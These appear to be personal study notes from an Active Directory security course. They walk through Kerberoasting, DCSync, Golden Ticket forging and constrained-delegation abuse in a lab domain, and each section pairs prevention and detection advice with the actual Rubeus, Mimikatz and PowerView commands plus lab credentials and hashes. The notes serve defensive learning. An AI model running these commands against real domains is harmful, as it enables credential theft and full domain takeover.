## Introduction and terminology

#### Active Directory 
- AD is like a phonebook + security guard of a company's IT env
- it's directory service that stores info about users, computers, printers and groups
- its centralized management system for authentication, authorization and accounting 
- If attackers hack AD → they can control **all users, all computers, all data** in the organization.  
- many hackers dont need new vulnerabilities they exploit misconfigurations and features that admins often overlook
- [extra resources](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview)

|Term|Meaning|Example|
|---|---|---|
|**Domain**|A group of objects (users, devices) that share the same AD database.|`company.local`|
|**Tree**|One or more domains grouped together.|`sales.company.local`, `hr.company.local` under `company.local`|
|**Forest**|A collection of trees (topmost level).|`company.local` + `partner.local` in same forest|
|**OU (Organizational Unit)**|A container for users, computers, or other OUs.|`OU=HR, OU=Finance`|
|**Trust**|A relationship allowing access between domains.|HR domain trusts Finance domain so HR users can access finance apps|
|**Domain Controller (DC)**|A server that runs AD and handles authentication & authorization.|Like the "gatekeeper"|
|**AD Data Store**|Stores AD database (`NTDS.DIT` file).|Located in `%SystemRoot%\NTDS`|
[Audit logon events](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/basic-audit-logon-events)

|Port|Service|
|---|---|
|53|DNS|
|88|Kerberos|
|135|RPC/WMI|
|137–139, 445|SMB|
|389, 636|LDAP|
|3389|RDP|
|5985, 5986|WinRM (PowerShell Remoting)|

---
## Overview and lab env

The assumption is that an attacker has already gained remote code execution (of some sort) on that Windows 10 (WS001) machine. The user, which we assume is compromised, is `Bob`, a regular user in Active Directory with no special permissions assigned.

The environment consists of the following machines and their corresponding IP addresses:

- `DC1`: `172.16.18.3`
- `DC2`: `172.16.18.4`
- `Server01`: `172.16.18.10`
- `PKI`: `172.16.18.15`
- `WS001`: `DHCP or 172.16.18.25` (depending on the section)
- `Kali Linux`: `DHCP or 172.16.18.20` (depending on the section)

### Connect to WS001 via RDP

```shell
xfreerdp /u:eagle\\bob /p:Slavi123 /v:10.129.17.215 /dynamic-resolution
```

### Transfer the files

![](attachments/Pasted%20image%2020250818123430.png)

To access the folder from the Kali machine, you can use the 'smbclient' command. Accessing the folder requires authentication, so you will need to provide credentials. The command can be executed with the Administrator account as follows:

```shell
smbclient \\\\TARGET_IP\\Share -U eagle/administrator%Slavi123
```

![](attachments/Pasted%20image%2020250818123709.png)

---

## kerberoasting 

![](attachments/Pasted%20image%2020250819060324.png)

TGT- encrypted ticket (this user is authenticated.)
token (service token) is when we request access to a specific service 

Attackers: grab those tickets → crack them offline → get the **service account password**.
In AD, [Service Principal Name (SPN)](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names) = tells Kerberos which account runs a service. (AS)

- **AES** → strong, slow to brute-force → attacker needs a lot more time.
- **RC4** → weaker, very fast to brute-force → attacker prefers this.
- **DES** → ancient, almost useless, but sometimes still enabled for legacy apps.
But attackers can **force a downgrade** (e.g., request RC4 instead of AES) if the environment still allows it.
That **Service Ticket** is encrypted with the **service account’s NTLM hash** (derived from its password).

### ATTACK

 [Rubeus](https://github.com/GhostPack/Rubeus) is the tool that we are using . this tool is used to fuck with AD env and perform many attacks
```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe kerberoast /outfile:spn.txt
```



---
---

## Credentials in Object Properties

- any thing in a AD will be objects (users, computer, group, OU...) all those thing will have the data (date of creation, info, last password change like that)
- so a user can access or read most properties of an object which are in (Description and Info)

### Attack

```powershell
Function SearchUserClearTextInformation
{
    Param (
        [Parameter(Mandatory=$true)]
        [Array] $Terms,

        [Parameter(Mandatory=$false)]
        [String] $Domain
    )

    if ([string]::IsNullOrEmpty($Domain)) {
        $dc = (Get-ADDomain).RIDMaster
    } else {
        $dc = (Get-ADDomain $Domain).RIDMaster
    }

    $list = @()

    foreach ($t in $Terms)
    {
        $list += "(`$_.Description -like `"*$t*`")"
        $list += "(`$_.Info -like `"*$t*`")"
    }

    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
        Where { Invoke-Expression ($list -join ' -OR ') } | 
        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet | 
        fl
}
```

We will run the script to hunt for the string `pass`, to find the password `Slavi123` in the `Description` property of the user `bonni`:

so we have written a function that is loaded in the current memory and we need do this 

```powershell
Get-ExecutionPolicy

Set-ExecutionPolicy RemoteSigned -Scope CurrentUser

```


#### Prevention

We have many options to prevent this attack/misconfiguration:

- `Perform` `continuous assessments` to detect the problem of storing credentials in properties of objects.
- `Educate` employees with high privileges to avoid storing credentials in properties of objects.
- `Automate` as much as possible of the user creation process to ensure that administrators don't handle the accounts manually, reducing the risk of introducing hardcoded credentials in user objects.

### Detection

- **Baseline admin/service-account behaviour**: establish normal sources, times, and frequency of logons for privileged accounts. Flag deviations.
    
- **Monitor authentication events**:
    
    - **4624** — successful interactive/logon events.
        
    - **4625** — failed logon attempts (useful for credential-guessing).
        
    - **4768** — Kerberos TGT request (shows Kerberos auth activity).
        
    - **4771 / 4776** — Kerberos/NTLM failure types (seen when wrong credentials are used).
        
- **Correlate events** in your SIEM: e.g., a successful 4624 or 4768 for an account whose Description/Info contains credentials → high priority.
    
- **Search AD properties**: regularly scan `Description` and `Info` for common password-like patterns (your `SearchUserClearTextInformation` function is exactly this — run it on a schedule).
    
- **Detect property tampering limitations**: Event **4738** shows a user object was modified but **does not** show which property changed or new values — so use it to trigger follow-up scans (re-scan Description/Info when 4738 occurs for privileged accounts).
    
- **Honeypot accounts**: create decoy credentials in Description for service/admin-type accounts and alert on any auth attempts (failed or successful) — failed attempts → 4625/4771/4776 hits.
    
- **Automate & alert**: create SIEM alerts for
    
    - any auth events for honeypot accounts,
        
    - unusual auths for admin/service accounts,
        
    - 4738 on high-privilege accounts + immediate re-scan of properties.

![](../attachments/Pasted%20image%2020251002191042.png)


```powershell
wmic useraccount
#It will list all user accounts known to the system/domain, showing properties

  
#Tip:Dont connect via RDP , instead connect like this

 runas /user:eagle\bonni cmd.exe
```

## Honeypot

Storing credentials in properties of objects is an excellent honeypot technique for not-very-mature environments. If struggling with basic cyber hygiene, then it is more likely expected to have such issues (storing credentials in properties of objects) in an AD environment. For setting up a honeypot user, we need to ensure the followings:

- The password/credential is configured in the `Description` field, as it's the easiest to pick up by any adversary.
- The provided password is fake/incorrect.
- The account is enabled and has recent login attempts.
- While we can use a regular user or a service account, service accounts are more likely to have this exposed as administrators tend to create them manually. In contrast, automated HR systems often make employee accounts (and the employees have likely changed the password already).
- The account has the last password configured 2+ years ago (makes it more believable that the password will likely work).

Because the provided password is wrong, we would primarily expect failed logon attempts; three event IDs (`4625`, `4771`, and `4776`) can indicate this. Here is how they look in our playground environment if an attacker is attempting to authenticate with the account `svc-iis` and a wrong password:

![](obsidian://open?vault=htb-CDSA-notes&file=attachments%2FPasted%20image%2020251002193643.png)

![](obsidian://open?vault=htb-CDSA-notes&file=attachments%2FPasted%20image%2020251002193718.png)

![](obsidian://open?vault=htb-CDSA-notes&file=attachments%2FPasted%20image%2020251002193740.png)

---
---

## DCSync

**DCSync** is an attack technique where an adversary **impersonates a Domain Controller** and asks a real DC to replicate directory data.

By abusing AD replication APIs, the attacker can pull **password hashes and secrets** (including NTLM hashes and Kerberos keys such as the `krbtgt` key) for any account — effectively allowing credential theft and forging tickets.

- **DCSync works because AD replication is a built‑in feature**.
- **DRSUAPI** (Directory Replication Service Remote Protocol) is the API AD uses for replication between domain controllers.
- A **DC always allows replication requests** — but it enforces **permissions** via ACLs.
- If an account has **Replicating Directory Changes** or **Replicating Directory Changes All** rights, the DC treats it as a valid replication partner and responds.

- **Get an account with replication rights** — attacker must control a user/computer that has one or both permissions:
    - **Replicating Directory Changes** (allows reading most directory attributes)
    - **Replicating Directory Changes All** (allows reading all domain secrets)
- **Call the AD replication API (DRSUAPI)** and request domain partition data from a DC.
- **Receive attributes** (password hashes, `unicodePwd`, `ntPasswordHistory`, krbtgt data).
- **Use stolen hashes/keys** for pass-the-hash, Golden Ticket, or full impersonation.

### Attack

user : Rocky
pass : Slavi123
when we check his account permission we can see

![](obsidian://open?vault=htb-CDSA-notes&file=attachments%2FPasted%20image%2020251002200934.png)

they we go to cmd

```powershell
runas /user:eagle\rocky cmd.exe
```

Subsequently, we need to use `Mimikatz`, one of the tools with an implementation for performing DCSync.

```powershell
C:\Mimikatz>mimikatz.exe

mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator
```

It is possible to specify the `/all` parameter instead of a specific username, which will dump the hashes of the entire AD environment. We can perform `pass-the-hash` with the obtained hash and authenticate against any Domain Controller.

### prevention 

The only prevention technique against this attack is using solutions such as the [RPC Firewall](https://github.com/zeronetworks/rpcfirewall), a third-party product that can block or allow specific RPC calls with robust granularity. For example, using `RPC Firewall`, we can only allow replications from Domain Controllers.

### Detection

Detecting DCSync is easy because each Domain Controller replication generates an event with the ID `4662`.

![](obsidian://open?vault=htb-CDSA-notes&file=attachments%2FPasted%20image%2020251002201606.png)

Since replications occur constantly, we can avoid false positives by ensuring the followings:

- Either the property `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` or `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` is [present in the event](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb).
- Whitelisting systems/accounts with a (valid) business reason for replicating, such as `Azure AD Connect` (this service constantly replicates Domain Controllers and sends the obtained password hashes to Azure AD).

---
---

## Golden Ticket

- **Kerberos TGT (Ticket Granting Ticket):** a Kerberos ticket that proves a user’s identity to the domain so they can request service tickets.
    
- **KDC (Key Distribution Center):** the service on the Domain Controller that issues and signs Kerberos tickets.
    
- **krbtgt account:** a special account automatically created in every domain. The KDC uses the **krbtgt account’s password hash** to derive the cryptographic key that signs every Kerberos TGT in that domain.

- **What it is:** A Golden Ticket is a fake Kerberos ticket (like a fake ID) that looks perfectly real because it’s signed with the same secret the domain uses.
- **Why it works:** The domain signs all real tickets with a key made from the **krbtgt account’s password hash**. If an attacker gets that hash, they can make tickets that the domain will accept.
- **What an attacker can do with it:** pretend to be **any user** (including admins), access resources, and stay hidden for a long time.
- **How they get to that point:** they first need very high access (usually Domain Admin) to read/extract the krbtgt password hash. So it’s not the first step in an attack — it’s what an attacker can do after they already broke in badly.

### Attack

What those Mimikatz options mean (plain words)

- **/domain** — which Active Directory domain the fake ticket is for (think: which company network).
    
- **/sid** — the domain’s unique identifier (a numeric ID that Windows uses internally). It ties the ticket to that specific domain.
    
- **/rc4** — the krbtgt account’s password hash (the secret the KDC uses to sign tickets). Possessing this is the core of the attack — it lets you make tickets that look legitimately signed.
    
- **/user** — the username the attacker wants the forged ticket to claim they are (e.g., `Administrator`).
    
- **/id** — the numeric user ID (the last part of the user’s SID). It’s used inside tickets to identify the account.
    
- **/renewmax** — sets how long the ticket can be renewed (in days). Attackers lower this to manage ticket behavior and avoid suspicious defaults.
    
- **/endin** — sets when the ticket expires (how long before it stops working). Attackers set this to avoid generating a ticket with a long, suspicious lifetime.

Why `/renewmax` and `/endin` matter
By default some tools create tickets with very long lifetimes (e.g., years). Long, unusual TGT lifetimes are easy to detect. So attackers often set `/renewmax` and `/endin` to **shorter, more plausible lifetimes** so the forged tickets blend in with normal traffic and are less likely to trigger alerts.

First, we need to obtain the password's hash of `krbtgt` and the `SID` value of the Domain. We can utilize `DCSync` with Rocky's account from the previous attack to obtain the hash:

```cmd
C:\WINDOWS\system32>cd ../../../

C:\>cd Mimikatz

C:\Mimikatz>mimikatz.exe


mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt

we need NTLM hash of the account

```

We will use the `Get-DomainSID` function from [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) to obtain the SID value of the Domain:

```powershell
PS C:\Users\bob\Downloads> powershell -exec bypass
. .\PowerView.ps1
Get-DomainSID
```

armed with all the required information, we can use `Mimikatz` to create a ticket for the account `Administrator`.

The `/ptt` argument makes `Mimikatz` [pass the ticket into the current session](https://adsecurity.org/?page_id=1821#KERBEROSPTT):

```cmd
mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
```

The output shows that `Mimikatz` injected the ticket in the current session, and we can verify that by running the command `klist` (after exiting from `Mimikatz`):

```powershell 
C:\Mimikatz>klist

#0>     Client: Administrator @ eagle.local
        Server: krbtgt/eagle.local @ eagle.local
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
----------------------------------------------------------------------------
#To verify that the ticket is working, we can list the content of the `C$` share of `DC1` using it:

dir \\dc1\c$

```

running `dir \\dc1\c$` is a quick practical check — if the forged Golden Ticket is accepted by the Domain Controller, SMB will let you list the DC’s C: admin share, so the `dir` succeeds; if the ticket is invalid or lacks privileges, you get access denied.

### Prevention 

- Block privileged users from authenticating to non-approved devices.
    
- Periodically reset the **krbtgt** account password (its hash is critical).
    
    - Use Microsoft’s **KrbtgtKeys.ps1** script (audit mode recommended).
        
    - The script forces DC replication so all Domain Controllers sync the new value.
        
- When resetting **krbtgt**, perform the reset **twice** (to clear password history of 2).
    
    - Wait the recommended interval (user ticket lifetime); do resets at least **10 hours apart** to avoid service breakage.
        
- Enforce **SIDHistory filtering** between domains in a forest to prevent child→parent escalation (note: may cause issues during domain migration).

### Detection 

- **Correlate user behavior** (normal location/time) and alert on deviations (e.g., privileged account logins from unexpected places).
    
- Monitor privileged accounts not authenticating from Privileged Access Workstations (PAWs).
    
- Watch Windows logon events: **4624** (successful) and **4625** (failed) for unusual privileged activity.
    
- Domain Controllers **won’t log** the Golden Ticket creation itself when forged on a compromised host, but you will see **successful logons to other systems** originating from that compromised machine.
    
- Look for TGS service requests for a user **without a previous TGT** (can be noisy/tedious to monitor).
    
- Example event IDs generated during the attack (when accessing `\\dc1\c$`): **4769** (TGS service requests — two tickets with different services).
    
- If **SID filtering** is enabled, cross-domain escalation will generate **event ID 4675**.

---
---

## kerberos constrained delegation 

What is Kerberos Delegation?

- Allows an application/service to access resources on another server **on behalf of a user**.
    
- Example: A web server service account requests access to an SQL server **as the user** after they log in, without the web server account itself needing SQL access.

Types of Delegation

1. **Unconstrained Delegation**
    
    - Most permissive (broad).
        
    - Account can delegate to _any_ service.
        
2. **Constrained Delegation**
    
    - Safer.
        
    - Account is configured to delegate only to specific service(s).
        
3. **Resource-based Delegation**
    
    - Configured on the **target computer object**.
        
    - Target specifies: “I trust only these accounts for delegation.”
        
    - Rarely used by admins in production.
        
    - Often abused by attackers.

### Attack

**Overview (attack idea):**
- When an account is _trusted for delegation_, it can ask the KDC for a Kerberos ticket **for another user (YYYY)** to access **a specific service (ZZZZ)** without that user’s password.
- Delegation can be extended via protocol transition: if trusted for LDAP, it can be used to obtain tickets for other services (CIFS, HTTP, etc.).

**Attack scenario in your content:**
- Compromised account: `web_service` (trusted for delegation).
- `web_service` password: `Slavi123`.
- Attacker requests a Kerberos ticket for user `YYYY` to access service `ZZZZ` (KDC issues it despite not having `YYYY`’s password).

- Being _trusted for delegation_ lets an account obtain Kerberos tickets on behalf of other users.

```
Note: Throughout the exercise, please use the `PowerView-main.ps1` located in `C:\Users\bob\Downloads` when enumerating with the `-TrustedToAuth` parameter.
```

```powershell
PS C:\Users\bob\Downloads> Get-NetUser -TrustedToAuth
```

![](obsidian://open?vault=htb-CDSA-notes&file=attachments%2FPasted%20image%2020251003115801.png)


Because `web_service` is trusted for delegation to DC1’s HTTP service, **if an attacker compromises `web_service`** they can request Kerberos tickets for any user and **use those tickets to connect to DC1 over PowerShell Remoting** (HTTP service enables PS Remoting).

Before we request a ticket with `Rubeus` (which expects a password hash instead of cleartext for the `/rc4` argument used subsequently), we need to use it to convert the plaintext password `Slavi123` into its `NTLM` hash equivalent:

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe hash /password:Slavi123

# Then, we will use `Rubeus` to get a ticket for the `Administrator` account:


PS C:\Users\bob\Downloads> .\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt

#To confirm that `Rubeus` injected the ticket in the current session, we can use the `klist` command:

> klist
```

With the ticket being available, we can connect to the Domain Controller impersonating the account `Administrator`:

```powershell
PS C:\Users\bob\Downloads> Enter-PSSession dc1
[dc1]: PS C:\Users\Administrator\Documents> hostname
DC1
[dc1]: PS C:\Users\Administrator\Documents> whoami
eagle\administrator
[dc1]: PS C:\Users\Administrator\Documents>
```

### Prevention 
- Configure **Account is sensitive and cannot be delegated** for all privileged users.
    
- Add privileged users to the **Protected Users** group (this applies the “cannot be delegated” protection).
    
    - Note: understand implications before enabling Protected Users.
        
- Treat **any account configured for delegation** as extremely privileged, even if it’s only a Domain user.
    
- Use **cryptographically secure passwords** to reduce risk from Kerberoasting (don’t let attackers gain delegated accounts).
    

### Detection 

- **Correlate user behavior** (usual logon location/time) and alert on deviations (e.g., privileged account logins from unexpected locations).
    
- Monitor privileged accounts not authenticating from **Privileged Access Workstations (PAWs)**.
    
- Proactively monitor **Event ID 4624** (successful logon) for unusual privileged activity.
    
- Look for logon events that include the **Transited Services** attribute — this can indicate an S4U (Service For User) delegated logon and reveal the ticket issuer.
    
- Remember: **S4U** allows a service to obtain a Kerberos ticket on behalf of a user (used in constrained delegation attacks).

![](obsidian://open?vault=htb-CDSA-notes&file=attachments%2FPasted%20image%2020251003120306.png)
